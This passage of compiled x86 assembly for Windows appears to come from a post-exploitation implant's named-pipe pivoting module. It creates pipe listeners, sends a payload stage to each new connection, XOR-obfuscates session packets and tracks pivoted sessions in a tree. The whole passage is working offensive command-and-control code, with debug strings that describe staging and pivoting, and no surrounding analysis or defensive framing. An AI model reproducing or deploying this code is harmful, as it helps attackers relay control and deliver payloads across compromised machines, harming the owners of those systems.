	.ascii "[NP-SERVER] checking the result of connect %u 0x%x\0"
	.align 4
LC65:
	.ascii "[NP-SERVER] still waiting for an overlapped connection\0"
	.align 4
LC66:
	.ascii "[NP-SERVER] client has connected apparently\0"
	.align 4
LC67:
	.ascii "[NP-SERVER] Failed to connect to the named pipe\0"
	.align 4
LC68:
	.ascii "[NP-SERVER] Checking the overlapped result\0"
	.align 4
LC69:
	.ascii "[NP-SERVER] server_notify. unable to get the result, %u\0"
	.align 4
LC70:
	.ascii "[NP-SERVER] still waiting for something to happen on the pipe\0"
	.align 4
LC71:
	.ascii "[NP-SERVER] the client appears to have bailed out, disconnecting...\0"
	.align 4
LC72:
	.ascii "[PIVOTTREE] Pivot sessions (after one removed)\0"
	.align 4
LC73:
	.ascii "[NP-SERVER] Apparently we have a result! With %u bytes\0"
	.align 4
LC74:
	.ascii "[NP-SERVER] This appears to be a new connection, setting up context.\0"
	.align 4
LC75:
	.ascii "[NP-SERVER] failed to create the pipe server instance: %u\0"
	.align 4
LC76:
	.ascii "[NP-SERVER] Updating the listener context in the pivot tree\0"
	.align 4
LC77:
	.ascii "[NP-SERVER] Sending stage on new connection\0"
	.align 4
LC78:
	.ascii "[NP-SERVER] Creating the guid request packet\0"
	.align 4
LC79:
	.ascii "[NP-SERVER] adding the request ID to the guid request packet\0"
	.align 4
LC80:
	.ascii "[NP-SERVER] Copying the request ID from the packet to the context\0"
	.align 4
LC81:
	.ascii "[NP-SERVER] We think the packet length is %u (0x%x)\0"
	.align 4
LC82:
	.ascii "[NP-SERVER] Doing the XOR thing on the guid request packet\0"
	.align 4
LC83:
	.ascii "[NP-SERVER] Sending the request packet to the new pivoted session\0"
	.align 4
LC84:
	.ascii "[NP-SERVER] Freeing up the packet buffer\0"
LC85:
	.ascii "[NP-SERVER] Done!\0"
	.align 4
LC86:
	.ascii "[NP-SERVER] read & sending bytes %u\0"
	.align 4
LC87:
	.ascii "[NP-SERVER] Resetting the event handle\0"
	.align 4
LC88:
	.ascii "[NP-SERVER] kicking off another read operation...\0"
	.text
	.def	_server_notify;	.scl	3;	.type	32;	.endef
_server_notify:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$104, %esp
	movl	$0, -12(%ebp)
	movl	$0, -20(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, -24(%ebp)
	movl	$0, -16(%ebp)
	cmpl	$0, -24(%ebp)
	jne	L81
	movl	$6, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC61, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L98
L81:
	movl	-24(%ebp), %eax
	movl	368(%eax), %eax
	cmpl	$-1, %eax
	jne	L83
	movl	$6, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC62, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L98
L83:
	movl	-24(%ebp), %eax
	movl	372(%eax), %eax
	testl	%eax, %eax
	jne	L84
	movl	-24(%ebp), %eax
	movl	$1, 372(%eax)
	movl	$LC63, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %edx
	movl	-24(%ebp), %eax
	movl	368(%eax), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__ConnectNamedPipe@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC64, (%esp)
	call	_real_dprintf
	cmpl	$997, -12(%ebp)
	jne	L85
	movl	$LC65, (%esp)
	call	_real_dprintf
	jmp	L98
L85:
	cmpl	$536, -12(%ebp)
	jne	L86
	movl	$LC66, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	movl	$1, 376(%eax)
	movl	$0, -12(%ebp)
	jmp	L84
L86:
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC67, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L98
L84:
	movl	$0, -64(%ebp)
	movl	$LC68, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %edx
	movl	-24(%ebp), %eax
	movl	368(%eax), %eax
	movl	$0, 12(%esp)
	leal	-64(%ebp), %ecx
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetOverlappedResult@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	jne	L88
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC69, (%esp)
	call	_real_dprintf
	cmpl	$996, -12(%ebp)
	jne	L89
	movl	$LC70, (%esp)
	call	_real_dprintf
	jmp	L101
L89:
	cmpl	$109, -12(%ebp)
	jne	L101
	movl	$LC71, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__ResetEvent@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$20, 4(%esp)
	movl	$0, (%esp)
	call	_packet_create
	movl	%eax, -56(%ebp)
	movl	-24(%ebp), %eax
	addl	$312, %eax
	movl	$16, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$262606, 4(%esp)
	movl	-56(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
	movl	-24(%ebp), %eax
	leal	312(%eax), %edx
	movl	8(%ebp), %eax
	movl	80(%eax), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_remove
	movl	%eax, -60(%ebp)
	movl	$LC72, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	80(%eax), %eax
	movl	%eax, (%esp)
	call	_dbgprint_pivot_tree
	cmpl	$0, -60(%ebp)
	je	L91
	movl	-60(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -60(%ebp)
L91:
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_terminate_pipe
	movl	-24(%ebp), %eax
	movl	364(%eax), %eax
	movl	$0, 8(%esp)
	movl	-56(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_packet_transmit
	movl	$109, %eax
	jmp	L92
L88:
	movl	-64(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC73, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	movl	376(%eax), %eax
	testl	%eax, %eax
	jne	L93
	movl	$LC74, (%esp)
	call	_real_dprintf
	movl	$65944, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -28(%ebp)
	movl	-28(%ebp), %eax
	movl	$-1, 368(%eax)
	movl	-24(%ebp), %eax
	movl	364(%eax), %edx
	movl	-28(%ebp), %eax
	movl	%edx, 364(%eax)
	movl	-24(%ebp), %eax
	movl	65932(%eax), %edx
	movl	-28(%ebp), %eax
	movl	%edx, 65932(%eax)
	movl	-24(%ebp), %eax
	movl	65936(%eax), %edx
	movl	-28(%ebp), %eax
	movl	%edx, 65936(%eax)
	call	_lock_create
	movl	-28(%ebp), %edx
	movl	%eax, 65940(%edx)
	movl	-24(%ebp), %eax
	leal	296(%eax), %edx
	movl	-28(%ebp), %eax
	addl	$296, %eax
	movl	$16, 12(%esp)
	movl	%edx, 8(%esp)
	movl	$16, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__memcpy_s, %eax
	call	*%eax
	movl	-24(%ebp), %eax
	leal	40(%eax), %edx
	movl	-28(%ebp), %eax
	addl	$40, %eax
	movl	$256, 12(%esp)
	movl	%edx, 8(%esp)
	movl	$256, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__memcpy_s, %eax
	call	*%eax
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_pipe_server_instance
	movl	%eax, -32(%ebp)
	cmpl	$0, -32(%ebp)
	je	L94
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC75, (%esp)
	call	_real_dprintf
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_free_server_context
L94:
	movl	-24(%ebp), %eax
	movl	$1, 376(%eax)
	movl	-24(%ebp), %eax
	leal	296(%eax), %edx
	movl	8(%ebp), %eax
	movl	84(%eax), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_find
	movl	%eax, -36(%ebp)
	cmpl	$0, -36(%ebp)
	je	L95
	movl	$LC76, (%esp)
	call	_real_dprintf
	movl	-36(%ebp), %eax
	movl	-28(%ebp), %edx
	movl	%edx, 8(%eax)
L95:
	movl	-24(%ebp), %eax
	movl	65932(%eax), %eax
	testl	%eax, %eax
	je	L96
	movl	-24(%ebp), %eax
	movl	65936(%eax), %eax
	testl	%eax, %eax
	je	L96
	movl	$LC77, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	addl	$65936, %eax
	movl	$4, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_named_pipe_write_raw
	movl	-24(%ebp), %eax
	movl	65936(%eax), %edx
	movl	-24(%ebp), %eax
	movl	65932(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_named_pipe_write_raw
	movl	-24(%ebp), %eax
	movl	$0, 65932(%eax)
L96:
	movl	$LC78, (%esp)
	call	_real_dprintf
	movl	$11, 4(%esp)
	movl	$0, (%esp)
	call	_packet_create
	movl	%eax, -40(%ebp)
	movl	$LC79, (%esp)
	call	_real_dprintf
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_request_id
	movl	$65538, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -44(%ebp)
	movl	$LC80, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	leal	332(%eax), %edx
	movl	$32, 8(%esp)
	movl	-44(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	movl	-40(%ebp), %eax
	movl	36(%eax), %eax
	addl	$32, %eax
	movl	%eax, -48(%ebp)
	movl	-48(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC81, (%esp)
	call	_real_dprintf
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -52(%ebp)
	movl	$LC82, (%esp)
	call	_real_dprintf
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_rand_xor_key
	movl	-40(%ebp), %eax
	movl	$32, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, (%esp)
	call	_memcpy
	movl	-48(%ebp), %eax
	leal	-32(%eax), %ecx
	movl	-40(%ebp), %eax
	movl	32(%eax), %eax
	movl	-52(%ebp), %edx
	addl	$32, %edx
	movl	%ecx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	movl	-48(%ebp), %eax
	leal	-4(%eax), %ecx
	movl	-52(%ebp), %eax
	leal	4(%eax), %edx
	movl	-40(%ebp), %eax
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_xor_bytes
	movl	$LC83, (%esp)
	call	_real_dprintf
	movl	-48(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_named_pipe_write_raw
	movl	$LC84, (%esp)
	call	_real_dprintf
	movl	-52(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$LC85, (%esp)
	call	_real_dprintf
L93:
	movl	-64(%ebp), %eax
	testl	%eax, %eax
	je	L97
	movl	-64(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC86, (%esp)
	call	_real_dprintf
	movl	-64(%ebp), %eax
	movl	-24(%ebp), %edx
	addl	$380, %edx
	movl	%eax, 8(%esp)
	movl	%edx, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_read_pipe_to_packet
L97:
	movl	$1, -16(%ebp)
	jmp	L98
L101:
	nop
L98:
	movl	-24(%ebp), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	je	L99
	movl	$LC87, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__ResetEvent@4, %eax
	call	*%eax
	subl	$4, %esp
L99:
	cmpl	$0, -16(%ebp)
	je	L100
	movl	-24(%ebp), %eax
	movl	$0, 8(%eax)
	movl	-24(%ebp), %eax
	movl	$0, 12(%eax)
	movl	$LC88, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %edx
	movl	-24(%ebp), %eax
	leal	380(%eax), %ecx
	movl	-24(%ebp), %eax
	movl	368(%eax), %eax
	movl	%edx, 16(%esp)
	movl	$0, 12(%esp)
	movl	$65536, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__ReadFile@20, %eax
	call	*%eax
	subl	$20, %esp
L100:
	movl	-12(%ebp), %eax
L92:
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC89:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. response == NULL\0"
	.align 4
LC90:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. ctx == NULL\0"
	.align 4
LC91:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName == NULL\0"
	.align 4
LC92:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName contains backslash (invalid)\0"
LC93:
	.ascii ".\0"
	.align 4
LC94:
	.ascii "[NP-SEVER] stage received, size is %u (%x)\0"
LC95:
	.ascii "\\\\%s\\pipe\\%s\0"
	.align 4
LC96:
	.ascii "[NP-SERVER] creation of the named pipe returned: %d 0x%x\0"
	.align 4
LC97:
	.ascii "[NP-SERVER] request_net_named_pipe_server_channel_open. named pipe server %s\0"
	.align 4
LC98:
	.ascii "[PIVOTTREE] Pivot listeners (after new one added)\0"
	.align 4
LC99:
	.ascii "[NP-SERVER] Error encountered %u 0x%x\0"
	.align 4
LC100:
	.ascii "[NP-SERVER] Destroying wait handle\0"
LC101:
	.ascii "[NP-SERVER] Destroying pipe\0"
	.text
	.globl	_request_core_pivot_add_named_pipe
	.def	_request_core_pivot_add_named_pipe;	.scl	2;	.type	32;	.endef
_request_core_pivot_add_named_pipe:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$88, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -20(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	jne	L103
	movl	$8, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC89, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L112
L103:
	movl	$65944, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L105
	movl	$8, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC90, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L112
L105:
	movl	-16(%ebp), %eax
	movl	8(%ebp), %edx
	movl	%edx, 364(%eax)
	call	_lock_create
	movl	-16(%ebp), %edx
	movl	%eax, 65940(%edx)
	movl	$66189, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -28(%ebp)
	cmpl	$0, -28(%ebp)
	jne	L106
	movl	$87, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC91, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L112
L106:
	movl	$92, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_strchr
	testl	%eax, %eax
	je	L107
	movl	$87, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC92, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L112
L107:
	cmpl	$0, -20(%ebp)
	jne	L108
	movl	$LC93, -20(%ebp)
L108:
	movl	$0, -44(%ebp)
	leal	-44(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262794, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -32(%ebp)
	cmpl	$0, -32(%ebp)
	je	L109
	movl	-16(%ebp), %eax
	leal	296(%eax), %edx
	movl	$16, 8(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
L109:
	movl	-16(%ebp), %eax
	addl	$65936, %eax
	movl	%eax, 8(%esp)
	movl	$262795, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -36(%ebp)
	cmpl	$0, -36(%ebp)
	je	L110
	movl	-16(%ebp), %eax
	movl	65936(%eax), %eax
	testl	%eax, %eax
	je	L110
	movl	-16(%ebp), %eax
	movl	65936(%eax), %edx
	movl	-16(%ebp), %eax
	movl	65936(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC94, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	movl	65936(%eax), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	%edx, 65932(%eax)
	movl	-16(%ebp), %eax
	movl	65936(%eax), %edx
	movl	-16(%ebp), %eax
	movl	65932(%eax), %eax
	movl	%edx, 8(%esp)
	movl	-36(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_memcpy
L110:
	movl	-16(%ebp), %eax
	movl	$-1, 368(%eax)
	movl	-16(%ebp), %eax
	leal	40(%eax), %edx
	movl	-28(%ebp), %eax
	movl	%eax, 20(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	$LC95, 12(%esp)
	movl	$255, 8(%esp)
	movl	$256, 4(%esp)
	movl	%edx, (%esp)
	movl	__imp___snprintf_s, %eax
	call	*%eax
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_pipe_server_instance
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC96, (%esp)
	call	_real_dprintf
	cmpl	$0, -12(%ebp)
	jne	L112
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC97, (%esp)
	call	_real_dprintf
	movl	$12, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, 8(%eax)
	movl	-40(%ebp), %eax
	movl	$_remove_listener, 4(%eax)
	movl	8(%ebp), %eax
	movl	84(%eax), %eax
	movl	-40(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-32(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_add
	movl	$LC98, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	84(%eax), %eax
	movl	%eax, (%esp)
	call	_dbgprint_pivot_tree
L112:
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	cmpl	$0, -12(%ebp)
	je	L120
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC99, (%esp)
	call	_real_dprintf
	cmpl	$0, -16(%ebp)
	je	L121
	movl	-16(%ebp), %eax
	movl	65940(%eax), %eax
	testl	%eax, %eax
	je	L116
	movl	-16(%ebp), %eax
	movl	65940(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_destroy
L116:
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	je	L117
	movl	$LC100, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L117:
	movl	-16(%ebp), %eax
	movl	368(%eax), %eax
	testl	%eax, %eax
	je	L118
	movl	-16(%ebp), %eax
	movl	368(%eax), %eax
	cmpl	$-1, %eax
	je	L118
	movl	$LC101, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	movl	368(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L118:
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	jmp	L114
L120:
	nop
	jmp	L114
L121:
	nop
L114:
	movl	-12(%ebp), %eax
	leave
	ret
.lcomm _attempted.83832,4,4
.lcomm _pAddMandatoryAce.83833,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_lock_acquire;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_lock_destroy;	.scl	2;	.type	32;	.endef
	.def	_lock_release;	.scl	2;	.type	32;	.endef
	.def	_scheduler_signal_waitable;	.scl	2;	.type	32;	.endef
	.def	_realloc;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
	.def	_calloc;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_string;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_raw;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_remove;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_add;	.scl	2;	.type	32;	.endef
	.def	_dbgprint_pivot_tree;	.scl	2;	.type	32;	.endef
	.def	_packet_create;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_raw;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit;	.scl	2;	.type	32;	.endef
	.def	_memmove;	.scl	2;	.type	32;	.endef
	.def	_scheduler_insert_waitable;	.scl	2;	.type	32;	.endef
	.def	_lock_create;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_find;	.scl	2;	.type	32;	.endef
	.def	_packet_add_request_id;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_rand_xor_key;	.scl	2;	.type	32;	.endef
	.def	_packet_create_response;	.scl	2;	.type	32;	.endef
	.def	_strchr;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_response;	.scl	2;	.type	32;	.endef
